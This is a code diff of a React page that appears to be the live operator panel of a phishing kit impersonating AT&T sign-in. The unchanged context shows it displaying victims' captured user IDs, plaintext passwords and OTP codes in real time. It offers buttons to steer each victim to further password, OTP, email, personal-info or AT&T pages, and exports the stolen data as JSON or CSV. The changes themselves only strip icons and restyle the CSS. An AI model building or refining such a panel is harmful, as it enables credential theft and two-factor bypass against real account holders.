@@ -110,31 +110,26 @@ export default function LinkPage() {
       let content = '';
       let className = '';
       let showActions = false;
-      let activityIcon = '';
       
       if (activity.type === 'userid') {
         content = `User ID entered: <strong>${userId}</strong>`;
         className = 'user-id-entry';
         showActions = true;
-        activityIcon = '👤';
       } else if (activity.type === 'password') {
         const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
         content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'password-entry';
         showActions = true;
-        activityIcon = '🔑';
       } else if (activity.type === 'signin') {
         const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
         content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'signin-entry';
         showActions = true;
-        activityIcon = '🚀';
       } else if (activity.type === 'otp') {
         const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
         content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
         className = 'otp-entry';
         showActions = true;
-        activityIcon = '🔢';
       }
 
       const activityItem = document.createElement('div');
@@ -145,74 +140,41 @@ export default function LinkPage() {
       if (showActions && activity.type === 'userid') {
         actionsHTML = `
           <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn primary" data-action="redirect" data-redirect="password">
-              <span class="btn-icon">🔐</span> Password Page
-            </button>
-            <button class="action-btn secondary" data-action="redirect" data-redirect="otp">
-              <span class="btn-icon">📱</span> OTP Code
-            </button>
-            <button class="action-btn secondary" data-action="redirect" data-redirect="email">
-              <span class="btn-icon">📧</span> Email Page
-            </button>
-            <button class="action-btn secondary" data-action="redirect" data-redirect="personal">
-              <span class="btn-icon">📋</span> Personal Info
-            </button>
-            <button class="action-btn att" data-action="redirect" data-redirect="att">
-              <span class="btn-icon">🌐</span> AT&T Sign In
-            </button>
-            <button class="action-btn danger" data-action="deny">
-              <span class="btn-icon">❌</span> Deny
-            </button>
+            <button class="action-btn" data-action="redirect" data-redirect="password">Password Page</button>
+            <button class="action-btn" data-action="redirect" data-redirect="otp">OTP Code</button>
+            <button class="action-btn" data-action="redirect" data-redirect="email">Email Page</button>
+            <button class="action-btn" data-action="redirect" data-redirect="personal">Personal Info</button>
+            <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
+            <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">
-            <span class="status-dot"></span> Waiting for redirect...
-          </div>
+          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
         `;
       } else if (showActions && activity.type === 'password') {
         actionsHTML = `
           <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn secondary" data-action="redirect" data-redirect="otp">
-              <span class="btn-icon">📱</span> OTP Code
-            </button>
-            <button class="action-btn secondary" data-action="redirect" data-redirect="email">
-              <span class="btn-icon">📧</span> Email Page
-            </button>
-            <button class="action-btn secondary" data-action="redirect" data-redirect="personal">
-              <span class="btn-icon">📋</span> Personal Info
-            </button>
-            <button class="action-btn att" data-action="redirect" data-redirect="att">
-              <span class="btn-icon">🌐</span> AT&T Sign In
-            </button>
-            <button class="action-btn danger" data-action="deny">
-              <span class="btn-icon">❌</span> Deny
-            </button>
+            <button class="action-btn" data-action="redirect" data-redirect="otp">OTP Code</button>
+            <button class="action-btn" data-action="redirect" data-redirect="email">Email Page</button>
+            <button class="action-btn" data-action="redirect" data-redirect="personal">Personal Info</button>
+            <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
+            <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">
-            <span class="status-dot"></span> Waiting for redirect...
-          </div>
+          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
         `;
       } else if (showActions) {
         actionsHTML = `
           <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn success" data-action="approve">
-              <span class="btn-icon">✓</span> Approve
-            </button>
-            <button class="action-btn danger" data-action="deny">
-              <span class="btn-icon">❌</span> Deny
-            </button>
+            <button class="action-btn" data-action="approve">Approve</button>
+            <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">
-            <span class="status-dot"></span> Pending approval...
-          </div>
+          <div class="activity-status status-pending" id="status-${activity.id}">Pending approval...</div>
         `;
       }
 
       activityItem.innerHTML = `
         <div class="card-header">
-          <span class="activity-icon">${activityIcon}</span>
           <div class="card-header-info">
             <div class="activity-time">${timeString}</div>
-            <div class="activity-type-badge ${className}">${activity.type.toUpperCase()}</div>
+            <div class="activity-type-badge">${activity.type.toUpperCase()}</div>
           </div>
         </div>
         <div class="activity-content">${content}</div>
@@ -511,7 +473,7 @@ export default function LinkPage() {
 
         body {
           font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          background: #f5f5f5;
           min-height: 100vh;
           padding: 20px;
         }
@@ -533,8 +495,7 @@ export default function LinkPage() {
         .ready-text {
           font-size: 56px;
           font-weight: 800;
-          color: #ffffff;
-          text-shadow: 0 2px 20px rgba(0, 0, 0, 0.2);
+          color: #000000;
           letter-spacing: -1px;
         }
 
@@ -545,25 +506,20 @@ export default function LinkPage() {
         }
 
         .export-btn {
-          background: rgba(255, 255, 255, 0.2);
-          backdrop-filter: blur(10px);
-          border: 1px solid rgba(255, 255, 255, 0.3);
-          color: white;
+          background: #ffffff;
+          border: 1px solid #d1d1d1;
+          color: #333;
           padding: 10px 20px;
-          border-radius: 10px;
+          border-radius: 6px;
           font-size: 14px;
           font-weight: 600;
           cursor: pointer;
-          transition: all 0.3s ease;
-          display: flex;
-          align-items: center;
-          gap: 8px;
+          transition: all 0.2s ease;
         }
 
         .export-btn:hover {
-          background: rgba(255, 255, 255, 0.3);
-          transform: translateY(-2px);
-          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+          background: #f5f5f5;
+          border-color: #999;
         }
 
         .monitor-panel {
@@ -615,47 +571,19 @@ export default function LinkPage() {
 
         .activity-card {
           background: #fafafa;
-          border-radius: 12px;
+          border-radius: 8px;
           padding: 20px;
           margin-bottom: 16px;
-          border-left: 4px solid #667eea;
-          transition: all 0.3s ease;
-          animation: slideIn 0.4s ease-out;
-        }
-
-        @keyframes slideIn {
-          from {
-            opacity: 0;
-            transform: translateY(-10px);
-          }
-          to {
-            opacity: 1;
-            transform: translateY(0);
-          }
+          border: 1px solid #e0e0e0;
+          transition: all 0.2s ease;
         }
 
         .activity-card:hover {
-          transform: translateX(4px);
-          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+          border-color: #999;
         }
 
         .card-header {
-          display: flex;
-          align-items: center;
-          gap: 12px;
           margin-bottom: 12px;
-        }
-
-        .activity-icon {
-          font-size: 24px;
-          width: 40px;
-          height: 40px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          background: white;
-          border-radius: 10px;
-          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
         }
 
         .card-header-info {
@@ -675,29 +603,11 @@ export default function LinkPage() {
           font-size: 11px;
           font-weight: 700;
           padding: 4px 10px;
-          border-radius: 6px;
+          border-radius: 4px;
           text-transform: uppercase;
           letter-spacing: 0.5px;
-        }
-
-        .user-id-entry .activity-type-badge {
-          background: #e3f2fd;
-          color: #1976d2;
-        }
-
-        .password-entry .activity-type-badge {
-          background: #e8f5e9;
-          color: #388e3c;
-        }
-
-        .signin-entry .activity-type-badge {
-          background: #fff3e0;
-          color: #f57c00;
-        }
-
-        .otp-entry .activity-type-badge {
-          background: #f3e5f5;
-          color: #7b1fa2;
+          background: #e0e0e0;
+          color: #333;
         }
 
         .activity-content {
@@ -709,35 +619,19 @@ export default function LinkPage() {
         }
 
         .activity-content strong {
-          color: #667eea;
+          color: #000;
           font-weight: 700;
         }
 
         .activity-content code {
-          background: #fff;
+          background: #f0f0f0;
           padding: 4px 10px;
-          border-radius: 6px;
+          border-radius: 4px;
           font-family: 'Monaco', 'Menlo', monospace;
           font-size: 14px;
-          color: #e91e63;
-          border: 1px solid #ffebee;
+          color: #333;
+          border: 1px solid #d0d0d0;
           font-weight: 600;
-        }
-
-        .user-id-entry {
-          border-left-color: #667eea;
-        }
-
-        .password-entry {
-          border-left-color: #00d084;
-        }
-
-        .signin-entry {
-          border-left-color: #ff6b6b;
-        }
-
-        .otp-entry {
-          border-left-color: #a78bfa;
         }
 
         .no-activity {
@@ -745,15 +639,6 @@ export default function LinkPage() {
           color: #999;
           font-size: 16px;
           padding: 60px 20px;
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          gap: 16px;
-        }
-
-        .no-activity-icon {
-          font-size: 64px;
-          opacity: 0.3;
         }
 
         .activity-actions {
@@ -764,108 +649,47 @@ export default function LinkPage() {
         }
 
         .action-btn {
-          padding: 10px 18px;
-          border: none;
-          border-radius: 8px;
-          font-size: 14px;
+          padding: 8px 16px;
+          border: 1px solid #d1d1d1;
+          border-radius: 4px;
+          font-size: 13px;
           font-weight: 600;
           cursor: pointer;
           transition: all 0.2s ease;
-          display: flex;
-          align-items: center;
-          gap: 6px;
-          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
-        }
-
-        .action-btn:hover {
-          transform: translateY(-2px);
-          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        }
-
-        .action-btn:active {
-          transform: translateY(0);
-        }
-
-        .btn-icon {
-          font-size: 16px;
-        }
-
-        .action-btn.primary {
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          color: white;
-        }
-
-        .action-btn.secondary {
-          background: #f0f0f0;
+          background: #ffffff;
           color: #333;
         }
 
-        .action-btn.secondary:hover {
-          background: #e0e0e0;
+        .action-btn:hover {
+          background: #f5f5f5;
+          border-color: #999;
         }
 
-        .action-btn.success {
-          background: #00d084;
-          color: white;
-        }
-
-        .action-btn.danger {
-          background: #ff6b6b;
-          color: white;
-        }
-
-        .action-btn.att {
-          background: #00a8e0;
-          color: white;
+        .action-btn:active {
+          background: #e8e8e8;
         }
 
         .activity-status {
           margin-top: 12px;
           font-size: 13px;
-          font-weight: 600;
-          display: flex;
-          align-items: center;
-          gap: 8px;
+          font-weight: 500;
+          color: #666;
           padding: 8px 12px;
-          border-radius: 6px;
+          border-radius: 4px;
           background: white;
-        }
-
-        .status-dot {
-          width: 8px;
-          height: 8px;
-          border-radius: 50%;
-          display: inline-block;
+          border: 1px solid #e0e0e0;
         }
 
         .status-pending {
           color: #666;
         }
 
-        .status-pending .status-dot {
-          background: #ffa726;
-          animation: blink 1.5s infinite;
-        }
-
-        @keyframes blink {
-          0%, 100% { opacity: 1; }
-          50% { opacity: 0.3; }
-        }
-
         .status-approved {
-          color: #00d084;
-        }
-
-        .status-approved .status-dot {
-          background: #00d084;
+          color: #333;
         }
 
         .status-denied {
-          color: #ff6b6b;
-        }
-
-        .status-denied .status-dot {
-          background: #ff6b6b;
+          color: #333;
         }
 
         .pagination-controls {
@@ -936,9 +760,9 @@ export default function LinkPage() {
         .info-box {
           margin-top: 20px;
           padding: 20px;
-          background: rgba(255, 255, 255, 0.95);
-          border-radius: 12px;
-          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+          background: #ffffff;
+          border-radius: 8px;
+          border: 1px solid #d1d1d1;
         }
 
         .info-box strong {
@@ -953,7 +777,7 @@ export default function LinkPage() {
           padding: 4px 8px;
           border-radius: 4px;
           font-family: monospace;
-          color: #667eea;
+          color: #333;
           font-weight: 600;
         }
 
@@ -997,10 +821,10 @@ export default function LinkPage() {
           <div className="ready-text">ready</div>
           <div className="header-actions">
             <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('json')}>
-              <span>💾</span> Export JSON
+              Export JSON
             </button>
             <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('csv')}>
-              <span>📊</span> Export CSV
+              Export CSV
             </button>
           </div>
         </div>
@@ -1012,7 +836,6 @@ export default function LinkPage() {
           </div>
           <div id="activity-log">
             <div className="no-activity">
-              <div className="no-activity-icon">🔍</div>
               <div>No activity yet. Waiting for login attempts...</div>
             </div>
           </div>
@@ -1028,7 +851,7 @@ export default function LinkPage() {
         </div>
         
         <div className="info-box">
-          <strong>✅ Real-Time Monitoring Active</strong>
+          <strong>Real-Time Monitoring Active</strong>
           Activities appear automatically without refresh • Access at <code>/link</code>
         </div>
       </div>
